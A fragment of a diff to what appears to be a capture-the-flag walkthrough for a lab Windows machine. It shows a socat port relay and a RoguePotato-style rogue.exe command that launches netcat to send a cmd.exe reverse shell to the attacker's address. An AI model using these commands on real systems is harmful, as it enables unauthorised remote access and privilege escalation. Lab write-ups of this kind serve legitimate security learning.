@@ -17,7 +17,7 @@ Saved as: shell.exe
 
 2.  we need to run this command on our machine
 
-command: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
+    command: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
 ```
 ┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
 └─$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
@@ -30,7 +30,7 @@ command: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
 ```
 
 3.  we need to run this command on our target machine
-command: rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999  
+    command: rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999  
 ```
 C:\Users\Public\desktop>rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                      
 rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e cmd.exe" -l 9999                                                                                                                                              
